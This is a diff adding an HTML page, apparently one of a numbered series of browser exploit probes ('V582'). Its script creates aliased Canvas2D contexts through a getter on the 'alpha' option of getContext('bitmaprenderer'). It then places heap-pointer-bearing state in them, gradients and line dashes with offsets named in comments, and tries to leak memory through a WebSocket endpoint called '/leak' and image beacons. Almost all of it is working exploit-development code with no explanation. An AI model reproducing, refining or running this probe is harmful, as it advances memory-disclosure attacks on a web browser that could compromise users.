@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V582</title></head>
+<body><pre id="out">V582 — WebSocket connection + data leak probe</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V582-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+
+bk('BOOT','v582-websocket-probe');
+say('V582: WebSocket leak probe\n');
+
+/* ===== Phase 1: Basic WebSocket connectivity test ===== */
+bk('PHASE1','ws-connect');
+
+var wsUrl = 'ws://'+location.hostname+':9090/leak';
+var ws = null;
+var wsConnected = false;
+var wsMessages = [];
+
+try {
+  ws = new WebSocket(wsUrl);
+  bk('WS-CREATE', 'ok,url=' + wsUrl);
+  say('WebSocket created: ' + wsUrl);
+
+  ws.onopen = function() {
+    wsConnected = true;
+    bk('WS-OPEN', 'connected');
+    say('WebSocket CONNECTED\n');
+
+    /* Phase 2: Send test data */
+    ws.send('HELLO-V582');
+    bk('WS-SENT', 'hello');
+
+    /* Phase 3: Send ArrayBuffer data */
+    var ab = new ArrayBuffer(256);
+    var view = new Uint8Array(ab);
+    for (var i = 0; i < 256; i++) view[i] = i;
+    ws.send(ab);
+    bk('WS-SENT-AB', '256B-sequential');
+    say('Sent 256B ArrayBuffer');
+
+    /* Phase 4: Test sending LARGE buffer */
+    try {
+      var big = new ArrayBuffer(65536);
+      var bv = new Float64Array(big);
+      for (var j = 0; j < bv.length; j++) bv[j] = j * 1.1;
+      ws.send(big);
+      bk('WS-SENT-BIG', '64KB');
+      say('Sent 64KB ArrayBuffer');
+    } catch(e) {
+      bk('WS-BIG-ERR', e.name);
+    }
+
+    /* Phase 5: Send transferred buffer (neutered) */
+    try {
+      var xab = new ArrayBuffer(128);
+      var xv = new Uint8Array(xab);
+      for (var k = 0; k < 128; k++) xv[k] = 0xCC;
+
+      /* Can we send a buffer, then transfer it, causing a race? */
+      ws.send(xab);
+      bk('WS-SENT-PRE-NEUTER', '128B-0xCC');
+
+      /* Now neuter it via structuredClone transfer */
+      var cloned = structuredClone(xab, {transfer: [xab]});
+      bk('WS-NEUTER', 'oldLen=' + xab.byteLength + ',clonedLen=' + cloned.byteLength);
+      say('Neutered: old=' + xab.byteLength + ' cloned=' + cloned.byteLength);
+    } catch(e) {
+      bk('WS-NEUTER-ERR', e.name + ':' + e.message.slice(0,60));
+    }
+
+    /* Phase 6: V573 alias + WebSocket = send pointer-containing memory? */
+    /* Create aliased Canvas2D pair */
+    var innerCtx = null;
+    var c1 = document.createElement('canvas');
+    c1.width = 1; c1.height = 1;
+    var d = {};
+    Object.defineProperty(d, 'alpha', {get: function() {
+      innerCtx = c1.getContext('2d');
+      return true;
+    }});
+    c1.getContext('bitmaprenderer', d);
+
+    var c2 = document.createElement('canvas');
+    c2.width = 4; c2.height = 4;
+    var ctx2 = c2.getContext('2d');
+
+    /* Verify alias */
+    ctx2.lineWidth = 9999.9999;
+    var aliasOK = innerCtx && (Math.abs(innerCtx.lineWidth - 9999.9999) < 0.001);
+    bk('ALIAS', aliasOK ? 'YES' : 'NO');
+    say('Alias: ' + (aliasOK ? 'CONFIRMED' : 'FAILED'));
+
+    if (aliasOK) {
+      /* Set gradient (stores heap pointer in CanvasStyle variant) */
+      var grad = ctx2.createLinearGradient(0, 0, 4, 4);
+      grad.addColorStop(0, '#ff0000');
+      grad.addColorStop(1, '#0000ff');
+      ctx2.strokeStyle = grad;
+      ctx2.fillStyle = grad;
+
+      /* Set lineDash (allocates heap buffer, pointer at State+168) */
+      ctx2.setLineDash([2, 4, 6, 8, 10, 12, 14, 16]);
+
+      /* Draw something with the aliased context to force state usage */
+      ctx2.beginPath();
+      ctx2.moveTo(0, 0);
+      ctx2.lineTo(4, 4);
+      ctx2.stroke();
+
+      /* Get canvas pixel data — contains rendered output */
+      try {
+        var imgData = ctx2.getImageData(0, 0, 4, 4);
+        ws.send(imgData.data.buffer);
+        bk('WS-SENT-PIXELS', imgData.data.length + 'B');
+        say('Sent ' + imgData.data.length + 'B pixel data via WS');
+      } catch(e) {
+        bk('WS-PIXEL-ERR', e.name + ':' + e.message.slice(0,60));
+      }
+
+      /* toDataURL as string */
+      try {
+        var dataUrl = c2.toDataURL();
+        ws.send('DATAURL:' + dataUrl.length + ':' + dataUrl.slice(0, 200));
+        bk('WS-DATAURL', 'len=' + dataUrl.length);
+      } catch(e) {
+        bk('WS-DU-ERR', e.name);
+      }
+
+      /* Send state dump as JSON */
+      var state = {};
+      try { state.lw = innerCtx.lineWidth; } catch(e) {}
+      try { state.ml = innerCtx.miterLimit; } catch(e) {}
+      try { state.ga = innerCtx.globalAlpha; } catch(e) {}
+      try { state.sb = innerCtx.shadowBlur; } catch(e) {}
+      try { state.ss = String(innerCtx.strokeStyle).slice(0, 100); } catch(e) {}
+      try { state.fs = String(innerCtx.fillStyle).slice(0, 100); } catch(e) {}
+      try { state.ld = innerCtx.getLineDash(); } catch(e) {}
+      try {
+        var xf = innerCtx.getTransform();
+        state.xf = [xf.a, xf.b, xf.c, xf.d, xf.e, xf.f];
+      } catch(e) {}
+
+      ws.send('STATE:' + JSON.stringify(state));
+      bk('WS-STATE', JSON.stringify(state).slice(0, 300));
+      say('Sent state dump via WS');
+
+      /* KEY TEST: Send Blob with mixed types */
+      try {
+        var parts = ['HEADER:', new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF]).buffer, ':FOOTER'];
+        var blob = new Blob(parts);
+        ws.send(blob);
+        bk('WS-BLOB', 'sent-mixed-blob,' + blob.size + 'B');
+      } catch(e) {
+        bk('WS-BLOB-ERR', e.name);
+      }
+    }
+
+    /* Schedule close */
+    setTimeout(function() {
+      ws.close();
+      bk('WS-CLOSE', 'clean');
+      say('WebSocket closed');
+    }, 2000);
+  };
+
+  ws.onmessage = function(ev) {
+    wsMessages.push(ev.data);
+    var preview = typeof ev.data === 'string' ? ev.data.slice(0, 100) : 'binary(' + ev.data.byteLength + 'B)';
+    bk('WS-RECV', preview);
+    say('Received: ' + preview);
+  };
+
+  ws.onerror = function(ev) {
+    bk('WS-ERR', 'error');
+    say('WebSocket ERROR');
+  };
+
+  ws.onclose = function(ev) {
+    bk('WS-CLOSED', 'code=' + ev.code + ',reason=' + (ev.reason || 'none'));
+    say('WebSocket closed: ' + ev.code);
+  };
+
+} catch(e) {
+  bk('WS-FAIL', e.name + ':' + e.message.slice(0, 100));
+  say('WebSocket FAILED: ' + e.message);
+}
+
+/* Timeout fallback */
+setTimeout(function() {
+  if (!wsConnected) {
+    bk('WS-TIMEOUT', 'no-connect-5s');
+    say('WebSocket: no connection after 5s');
+  }
+  bk('DONE', 'v582-complete,ws=' + wsConnected + ',msgs=' + wsMessages.length);
+  say('\nV582 complete. Connected: ' + wsConnected + ', messages: ' + wsMessages.length);
+}, 6000);
+</script>
+</body></html>
